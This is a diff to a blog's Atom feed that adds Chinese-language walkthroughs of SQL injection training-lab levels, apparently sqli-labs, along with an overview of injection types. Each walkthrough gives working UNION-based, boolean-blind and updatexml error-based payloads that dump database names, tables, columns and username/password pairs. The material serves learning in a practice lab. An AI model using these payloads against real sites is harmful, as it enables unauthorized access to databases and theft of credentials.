@@ -37,9 +37,140 @@
   </entry>
   
   <entry>
+    <title>6</title>
+    <link href="http://example.com/2022/02/14/06/"/>
+    <id>http://example.com/2022/02/14/06/</id>
+    <published>2022-02-14T02:01:32.000Z</published>
+    <updated>2022-02-25T16:06:06.093Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="less-06"><a href="#less-06" class="headerlink" title="less 06"></a>less 06</h3><p>1.输入?id=1‘’,页面报错，输入id=1’‘–+，则页面回显正常.</p><p>说明注入点为引号位置。</p><p>2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）</p><p>可知列数为3.————?id=1’‘ order by 3–+ </p><p>3.运用函数进行逐个判断</p><p>（1）运用函数left进行数据判断</p><p>?id=1’’ and left((select database()),1)=’s’–+ 判断第一位是否是s，然后使用bp进行爆破处理：</p><p> （2）运用数字和字母与ascii码的转换进行判断</p><p>id=1’‘ and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))&gt;1</p><p>?id=1’ and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),1,1)) &gt;1 –+  </p><p>————此处用二分法进行猜字段，从而推断数据库的名称</p><p>  （3）用updatexml函数</p><p>查库</p><p>?id=1’‘and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,30),’~’),1)–+</p><p>查表</p><p>?id=1’’ and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=’security’),1,30),’~’),1)–+</p><p>查列</p><p>?id=1’’ and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=’users’),1,30),’~’),1)–+</p><p>查数据</p><p>?id=1’’ and updatexml(1,concat(0x7e,substr((select group_concat(username，password) from security.users),1,30),’~’),1)–+</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;less-06&quot;&gt;&lt;a href=&quot;#less-06&quot; class=&quot;headerlink&quot; title=&quot;less 06&quot;&gt;&lt;/a&gt;less 06&lt;/h3&gt;&lt;p&gt;1.输入?id=1‘’,页面报错，输入id=1’‘–+，则页面回显正常.&lt;/p&gt;
+&lt;p&gt;说明注入点为</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>5</title>
+    <link href="http://example.com/2022/02/13/05/"/>
+    <id>http://example.com/2022/02/13/05/</id>
+    <published>2022-02-13T12:26:36.000Z</published>
+    <updated>2022-02-25T15:59:30.056Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="less-05"><a href="#less-05" class="headerlink" title="less 05"></a>less 05</h3><p>1.输入?id=1,系统返回——you are in……——说明输入正确</p><p>​         此类型的注入通过系统返回you are in……来对我们的输入进行判断</p><p>2.输入?id=1’,页面报错，输入id=1‘–+，则页面回显正常.</p><p>说明注入点为引号位置。</p><p>3.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）</p><p>可知列数为3.————?id=1’ order by 3–+ </p><p>4.运用函数进行逐个判断</p><p>（1）运用函数left进行数据判断</p><p>?id=1’ and left((select database()),1)=’s’–+ 判断第一位是否是s，然后使用bp进行爆破处理：</p><p> （2）运用数字和字母与ascii码的转换进行判断</p><p>id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))&gt;1</p><p>?id=1’ and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),1,1)) &gt;1 –+  </p><p>————此处用二分法进行猜字段，从而推断数据库的名称</p><p>  （3）用updatexml函数</p><p>查库</p><p>?id=1’ and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,30),’~’),1)–+</p><p>查表</p><p>?id=1’ and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=’security’),1,30),’~’),1)–+</p><p>查列</p><p>?id=1’ and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=’users’),1,30),’~’),1)–+</p><p>查数据</p><p>?id=1’ and updatexml(1,concat(0x7e,substr((select group_concat(username，password) from security.users),1,30),’~’),1)–+</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;less-05&quot;&gt;&lt;a href=&quot;#less-05&quot; class=&quot;headerlink&quot; title=&quot;less 05&quot;&gt;&lt;/a&gt;less 05&lt;/h3&gt;&lt;p&gt;1.输入?id=1,系统返回——you are in……——说明输入正确&lt;/p&gt;
+&lt;p&gt;​     </summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>4</title>
+    <link href="http://example.com/2022/02/06/04/"/>
+    <id>http://example.com/2022/02/06/04/</id>
+    <published>2022-02-06T08:20:18.000Z</published>
+    <updated>2022-02-25T15:25:23.373Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.?id=1 回显有结果，?id=1’系统报错，?id=1’–+——依然报错。此时进行判断类型：</p><p>若?id=1 and 1=2  发现页面回显正常,所以为字符注入。</p><p>观察MySQL命令行，发现该题以  ‘’)  来闭合字符</p><p>2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）</p><p>可知列数为3.————?id=1’’ )order by 3–+ </p><p>3.用id=-1；来使数据库进行报错，并加入union select 1,2,3, –+语句进行顶替</p><p>————?id=-1’’) union select 1,2,3–+</p><p>使显示位显示的数据为username：2，password：3。</p><p>4.选择username或password的位置进行显示我们要查询的数据。</p><p>用语句————?id=-1’’) union select 1,2,group_concat(schema_name)from information_schema.schemata–+</p><p>查询显示出好几个库名 选择security作为查询对象。</p><p>或者用语句————?id=-1’’) union select 1,2,database()–+进行查询，结果为security</p><p>5.查询表中数据</p><p>?id=-1’’) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’ –+</p><p>6.查询列中的数据</p><p>?id=-1’’ )union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p>7.查询username和password数据?id=-1’’) union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users–+</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;1.?id=1 回显有结果，?id=1’系统报错，?id=1’–+——依然报错。此时进行判断类型：&lt;/p&gt;
+&lt;p&gt;若?id=1 and 1=2  发现页面回显正常,所以为字符注入。&lt;/p&gt;
+&lt;p&gt;观察MySQL命令行，发现该题以  ‘’)  来闭合字符&lt;/p&gt;
+&lt;p&gt;2.输</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>3</title>
+    <link href="http://example.com/2022/02/06/03/"/>
+    <id>http://example.com/2022/02/06/03/</id>
+    <published>2022-02-06T05:35:28.000Z</published>
+    <updated>2022-02-25T15:19:06.351Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.?id=1 回显有结果，?id=1’——报错，?id=1’–+——依然报错。</p><p>观察MySQL命令行，发现该题以  ‘)  来闭合字符</p><p>2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）</p><p>可知列数为3.————?id=1’ )order by 3–+ </p><p>3.用id=-1；来使数据库进行报错，并加入union select 1,2,3, –+语句进行顶替</p><p>————?id=-1’) union select 1,2,3–+</p><p>使显示位显示的数据为username：2，password：3。</p><p>4.选择username或password的位置进行显示我们要查询的数据。</p><p>用语句————?id=-1’) union select 1,2,group_concat(schema_name)from information_schema.schemata–+</p><p>查询显示出好几个库名 选择security作为查询对象。</p><p>或者用语句————?id=-1’) union select 1,2,database()–+进行查询，结果为security</p><p>5.查询表中数据</p><p>?id=-1’) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’ –+</p><p>6.查询列中的数据</p><p>?id=-1’ )union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p>7.查询username和password数据?id=-1’) union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users–+</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;1.?id=1 回显有结果，?id=1’——报错，?id=1’–+——依然报错。&lt;/p&gt;
+&lt;p&gt;观察MySQL命令行，发现该题以  ‘)  来闭合字符&lt;/p&gt;
+&lt;p&gt;2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）&lt;/p&gt;
+&lt;p&gt;可知列数为3.</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>second</title>
+    <link href="http://example.com/2022/02/06/second/"/>
+    <id>http://example.com/2022/02/06/second/</id>
+    <published>2022-02-06T04:37:24.000Z</published>
+    <updated>2022-02-25T15:19:53.833Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.?id=1 回显有结果，?id=1‘回显错误，若为?id=1’–+依然报错，但输入?id=1 and 1=2显示错误则为数字型注入</p><p>————若正确则为字符型</p><p>2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）</p><p>可知列数为3.————?id=1’ order by 3–+ </p><p>3.用id=-1；来使数据库进行报错，并加入union select 1,2,3, –+语句进行顶替</p><p>————?id=-1’ union select 1,2,3–+</p><p>使显示位显示的数据为username：2，password：3。</p><p>4.选择username或password的位置进行显示我们要查询的数据。</p><p>用语句————?id=-1’ union select 1,2,group_concat(schema_name)from information_schema.schemata–+</p><p>查询显示出好几个库名 选择security作为查询对象。</p><p>或者用语句————?id=-1’ union select 1,2,database()–+进行查询，结果为security</p><p>5.查询表中数据</p><p>?id=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’ –+</p><p>6.查询列中的数据</p><p>?id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p>7.查询username和password数据?id=-1’ union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users–+</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;1.?id=1 回显有结果，?id=1‘回显错误，若为?id=1’–+依然报错，但输入?id=1 and 1=2显示错误则为数字型注入&lt;/p&gt;
+&lt;p&gt;————若正确则为字符型&lt;/p&gt;
+&lt;p&gt;2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）&lt;/p</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>注入类型</title>
+    <link href="http://example.com/2022/02/04/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/"/>
+    <id>http://example.com/2022/02/04/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/</id>
+    <published>2022-02-04T08:09:46.000Z</published>
+    <updated>2022-02-25T14:27:00.947Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="1-注入类型"><a href="#1-注入类型" class="headerlink" title="1.注入类型"></a>1.注入类型</h2><p><strong>sql注入形成的原因：用户被输入的非法数据被解释器执行</strong></p><h3 id="由注入类容区分为："><a href="#由注入类容区分为：" class="headerlink" title="由注入类容区分为："></a>由注入类容区分为：</h3><ol><li><p>数字类型注入</p></li><li><p>字符类型注入</p><p>（可通过系统的报错进行判断）</p></li></ol><h3 id="由提交方式分为："><a href="#由提交方式分为：" class="headerlink" title="由提交方式分为："></a>由提交方式分为：</h3><ol><li>get注入</li><li>post注入</li><li>cookies注入</li><li>http注入</li></ol><h3 id="由获取信息不同分为："><a href="#由获取信息不同分为：" class="headerlink" title="由获取信息不同分为："></a>由获取信息不同分为：</h3><ol><li><p>基于bool的盲注，即可以根据返回页面判断条件真假的注入</p></li><li><p>基于时间的盲注，即不能根据页面返回类容判断任何信息，需要用条件语句查看时间延迟语句是否执行来判断。————常见sleep注入</p></li><li><p>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接放回在页面中。</p><p>主要分为三种：</p><p>1.extractvalue函数</p><p>2.updatexml函数</p><p>3.floor()函数</p></li></ol><hr>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;1-注入类型&quot;&gt;&lt;a href=&quot;#1-注入类型&quot; class=&quot;headerlink&quot; title=&quot;1.注入类型&quot;&gt;&lt;/a&gt;1.注入类型&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;sql注入形成的原因：用户被输入的非法数据被解释器执行&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 i</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>1</title>
-    <link href="http://example.com/2022/01/28/01/"/>
-    <id>http://example.com/2022/01/28/01/</id>
+    <link href="http://example.com/2022/01/28/less%2001/"/>
+    <id>http://example.com/2022/01/28/less%2001/</id>
     <published>2022-01-28T13:19:38.000Z</published>
     <updated>2022-02-25T13:45:52.130Z</updated>
     
